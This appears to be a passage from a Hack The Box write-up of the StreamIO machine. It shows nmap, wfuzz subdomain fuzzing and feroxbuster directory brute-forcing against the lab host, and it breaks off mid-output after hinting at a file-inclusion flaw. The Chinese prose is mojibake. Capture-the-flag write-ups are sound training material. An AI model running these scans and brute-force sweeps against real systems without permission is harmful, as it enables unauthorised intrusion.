<p>æ¥ä¸‹æ¥è¿›è¡Œè¯¦ç»†ç«¯å£æ‰«æï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p 53,80,88,135,139,389,443,445,464,593,636,5985,9389,49667,49673,49674,49705,51260 --min-rate 5000 -oA nmapscan/details 10.10.11.158</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.158</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-08 12:44:22Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)</span><br><span class="line">443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-12-08T12:46:06+00:00; +7h00m00s from scanner time.</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">| ssl-cert: Subject: commonName=streamIO/countryName=EU</span><br><span class="line">| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb</span><br><span class="line">| Not valid before: 2022-02-22T07:03:28</span><br><span class="line">|_Not valid after:  2022-03-24T07:03:28</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49674/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49705/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">51260/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2023-12-08T12:45:31</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Fri Dec  8 00:46:13 2023 -- 1 IP address (1 host up) scanned in 119.55 seconds</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æ‰«æä¿¡æ¯ï¼Œå¯ä»¥åˆ¤æ–­è¿™æ˜¯ä¸€å°DCã€‚æ¥ç€å°†<code>streamio.htb</code>å’Œ<code>watch.streamio.htb</code>å†™å…¥åˆ°hostsã€‚å› ä¸ºå¼€æ”¾äº†139å’Œ445ç«¯å£ï¼Œå°è¯•smbåŒ¿åè¿æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ec7c458853aef535078.jpg"></a></p>
<p>æ‰§è¡Œ<code>crackmapexec smb 10.10.11.158</code>å¯ä»¥æ‰«åˆ°ä¸€å°æœºå­ï¼Œå°†<code>dc.streamio.htb</code>ä¹Ÿæ·»åŠ è¿›hostsï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ed3c458853aef536a2a.jpg"></a></p>
<p>æ¥ä¸‹æ¥å°±æ‰«ä¸€ä¸‹å­åŸŸåå§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H <span class="string">&quot;HOST: FUZZ.streamio.htb&quot;</span> -u https://streamio.htb/ --hw 24 --hc 400</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: https://streamio.htb/</span></span><br><span class="line"><span class="string">Total requests: 19966</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                   </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000002268:   200        78 L     245 W      2829 Ch     &quot;watch - watch&quot;                                                                                                           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Total time: 240.1962</span></span><br><span class="line"><span class="string">Processed Requests: 19966</span></span><br><span class="line"><span class="string">Filtered Requests: 19965</span></span><br><span class="line"><span class="string">Requests/sec.: 83.12368</span></span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰æ”¶è·ï¼Œåªæ‰«åˆ°ä¸€ä¸ªå·²æœ‰çš„watch.streamio.htbã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®ä¸€ä¸‹è¿™å°ä¸»æœºéƒ¨ç½²çš„WebæœåŠ¡ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760edec458853aef537a1d.jpg"></a></p>
<p>80ç«¯å£æ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„IIS Serverçš„æ¬¢è¿ç•Œé¢ï¼Œæ²¡ä»€ä¹ˆå€¼å¾—å…³æ³¨çš„ç‚¹ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è®¿é—®ä¸€ä¸‹443ç«¯å£ï¼Œä»¥ä¸‹æ˜¯<a href="https://streamio.htbçš„ç•Œé¢ï¼š">https://streamio.htbçš„ç•Œé¢ï¼š</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760eeac458853aef5388e3.jpg"></a></p>
<p>å°è¯•æ³¨å†Œç™»å½•ï¼Œæ˜¾ç¤ºæ³¨å†ŒæˆåŠŸï¼Œä½†æ˜¯ç™»å½•å´ç™»å½•ä¸ä¸Šï¼Œsqlmapæ‰«äº†ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ã€‚å¯¹å…¶ä»–åœ°æ–¹è¿›è¡Œæ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰å‘ç°å¯ç–‘çš„ç‚¹ã€‚æ¥ä¸‹æ¥çœ‹çœ‹<a target="_blank" rel="noopener" href="https://watch.streamio.htb/%EF%BC%9A">https://watch.streamio.htb/ï¼š</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760ef4c458853aef539eff.jpg"></a></p>
<p>åˆ†æä¹‹åæ²¡å¾—åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚é‚£æ¥ä¸‹æ¥å°±çˆ†ç ´ä¸€ä¸‹ç›®å½•å§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span></span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ¯  Target Url            â”‚ https://streamio.htb</span><br><span class="line"> ğŸš€  Threads               â”‚ 50</span><br><span class="line"> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!</span><br><span class="line"> ğŸ’¥  Timeout (secs)        â”‚ 7</span><br><span class="line"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1</span><br><span class="line"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> ğŸ”  Extract Links         â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ’²  Extensions            â”‚ [php]</span><br><span class="line"> ğŸ  HTTP methods          â”‚ [GET]</span><br><span class="line"> ğŸ”“  Insecure              â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ”ƒ  Recursion Depth       â”‚ 4</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">301      GET        2l       10w      151c https://streamio.htb/images =&gt; https://streamio.htb/images/</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/admin =&gt; https://streamio.htb/admin/</span><br><span class="line">301      GET        2l       10w      147c https://streamio.htb/js =&gt; https://streamio.htb/js/</span><br><span class="line">301      GET        2l       10w      148c https://streamio.htb/css =&gt; https://streamio.htb/css/</span><br><span class="line">200      GET        2l     1276w    88145c https://streamio.htb/js/jquery-3.4.1.min.js</span><br><span class="line">200      GET      231l      571w     7825c https://streamio.htb/about.php</span><br><span class="line">200      GET      192l     1006w    82931c https://streamio.htb/images/icon.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/index.php</span><br><span class="line">200      GET      101l      173w     1663c https://streamio.htb/css/responsive.css</span><br><span class="line">200      GET      111l      269w     4145c https://streamio.htb/login.php</span><br><span class="line">200      GET        5l      374w    21257c https://streamio.htb/js/popper.min.js</span><br><span class="line">200      GET       51l      213w    19329c https://streamio.htb/images/client.jpg</span><br><span class="line">200      GET      863l     1698w    16966c https://streamio.htb/css/style.css</span><br><span class="line">200      GET      206l      430w     6434c https://streamio.htb/contact.php</span><br><span class="line">200      GET      913l     5479w   420833c https://streamio.htb/images/about-img.png</span><br><span class="line">302      GET        0l        0w        0c https://streamio.htb/logout.php =&gt; https://streamio.htb/</span><br><span class="line">200      GET      367l     1995w   166220c https://streamio.htb/images/contact-img.png</span><br><span class="line">200      GET      395l      915w    13497c https://streamio.htb/</span><br><span class="line">200      GET      121l      291w     4500c https://streamio.htb/register.php</span><br><span class="line">200      GET      191l      253w     3120c https://streamio.htb/css/login.css</span><br><span class="line">301      GET        2l       10w      157c https://streamio.htb/admin/images =&gt; https://streamio.htb/admin/images/</span><br><span class="line">301      GET        2l       10w      154c https://streamio.htb/admin/css =&gt; https://streamio.htb/admin/css/</span><br><span class="line">301      GET        2l       10w      153c https://streamio.htb/admin/js =&gt; https://streamio.htb/admin/js/</span><br><span class="line">200      GET      274l     1677w   150222c https://streamio.htb/images/barry.png</span><br><span class="line">200      GET     2059l    12754w  1028337c https://streamio.htb/images/samantha.png</span><br><span class="line">200      GET     1753l    10007w   871140c https://streamio.htb/images/oliver.png</span><br><span class="line">301      GET        2l       10w      150c https://streamio.htb/fonts =&gt; https://streamio.htb/fonts/</span><br><span class="line">403      GET        1l        1w       18c https://streamio.htb/admin/index.php</span><br><span class="line">301      GET        2l       10w      156c https://streamio.htb/admin/fonts =&gt; https://streamio.htb/admin/fonts/</span><br><span class="line">200      GET        2l        6w       58c https://streamio.htb/admin/master.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/con</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/con</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/con</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/con</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/con</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/con</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/con</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/con</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/con</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/aux</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/aux</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/aux</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/aux</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/aux</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/aux</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/aux</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/aux</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/aux</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/images/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/css/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/js/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/fonts/error%1F_log.php</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log</span><br><span class="line">400      GET        6l       26w      324c https://streamio.htb/admin/fonts/error%1F_log.php</span><br><span class="line">404      GET       40l      156w     1888c https://streamio.htb/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/admin/prn</span><br><span class="line">404      GET       40l      156w     1895c https://streamio.htb/images/prn</span><br><span class="line">404      GET       40l      156w     1891c https://streamio.htb/js/prn</span><br><span class="line">404      GET       40l      156w     1892c https://streamio.htb/css/prn</span><br><span class="line">404      GET       40l      156w     1901c https://streamio.htb/admin/images/prn</span><br><span class="line">404      GET       40l      156w     1898c https://streamio.htb/admin/css/prn</span><br><span class="line">404      GET       40l      156w     1897c https://streamio.htb/admin/js/prn</span><br><span class="line">404      GET       40l      156w     1894c https://streamio.htb/fonts/prn</span><br><span class="line">404      GET       40l      156w     1900c https://streamio.htb/admin/fonts/prn</span><br><span class="line">[<span class="comment">####################] - 13m   265889/265889  0s      found:80      errors:1      </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/images/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/css/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/js/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/fonts/ </span></span><br><span class="line">[<span class="comment">####################] - 13m    26584/26584   34/s    https://streamio.htb/admin/fonts/</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°ä¸€ä¸ª&#x2F;adminçš„ç›®å½•ï¼Œç›´æ¥è®¿é—®æ˜¾ç¤ºforbiddenï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f03c458853aef53bfaa.jpg"></a></p>
<p>å‘ç°çˆ†ç ´ç»“æœä¸­è¿˜æœ‰ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://streamio.htb/admin/master.php%EF%BC%8C%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%8B%EF%BC%9A">https://streamio.htb/admin/master.phpï¼Œè®¿é—®ä¸€ä¸‹ï¼š</a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f0cc458853aef53cb7a.jpg"></a></p>
<p>æç¤ºæˆ‘ä»¬åªèƒ½é€šè¿‡åŒ…å«æ¥è®¿é—®ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æ–­æŸä¸ªåœ°æ–¹åº”è¯¥æ˜¯å­˜åœ¨LFIçš„ã€‚è¿™ä¸ªåŸŸåçš„å…¶ä½™ç›®å½•æ²¡ä»€ä¹ˆæ”¶è·ï¼Œæ¥ä¸‹æ¥çˆ†ç ´ä¸€ä¸‹watch.streamio.htbè¿™ä¸ªäºŒçº§åŸŸåçš„ç›®å½•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$ feroxbuster -u https://watch.streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span><br><span class="line"></span><br><span class="line"> ___  ___  __   __     __      __         __   ___</span><br><span class="line">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span><br><span class="line">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span><br><span class="line">by Ben <span class="string">&quot;epi&quot;</span> Risher ğŸ¤“                 ver: 2.10.1</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ¯  Target Url            â”‚ https://watch.streamio.htb</span><br><span class="line"> ğŸš€  Threads               â”‚ 50</span><br><span class="line"> ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</span><br><span class="line"> ğŸ‘Œ  Status Codes          â”‚ All Status Codes!</span><br><span class="line"> ğŸ’¥  Timeout (secs)        â”‚ 7</span><br><span class="line"> ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.10.1</span><br><span class="line"> ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml</span><br><span class="line"> ğŸ”  Extract Links         â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ’²  Extensions            â”‚ [php]</span><br><span class="line"> ğŸ  HTTP methods          â”‚ [GET]</span><br><span class="line"> ğŸ”“  Insecure              â”‚ <span class="literal">true</span></span><br><span class="line"> ğŸ”ƒ  Recursion Depth       â”‚ 4</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter</span><br><span class="line">200      GET      136l      295w    22042c https://watch.streamio.htb/static/logo.png</span><br><span class="line">200      GET      192l     1006w    82931c https://watch.streamio.htb/static/icon.png</span><br><span class="line">200      GET       72l      112w      875c https://watch.streamio.htb/static/css/index.css</span><br><span class="line">200      GET       78l      245w     2829c https://watch.streamio.htb/</span><br><span class="line">200      GET       25l       34w      247c https://watch.streamio.htb/static/css/search.css</span><br><span class="line">200      GET    10837l    20418w   195704c https://watch.streamio.htb/static/css/bootstrap.css</span><br><span class="line">200      GET     7193l    19558w   253905c https://watch.streamio.htb/search.php</span><br><span class="line">301      GET        2l       10w      161c https://watch.streamio.htb/static/css 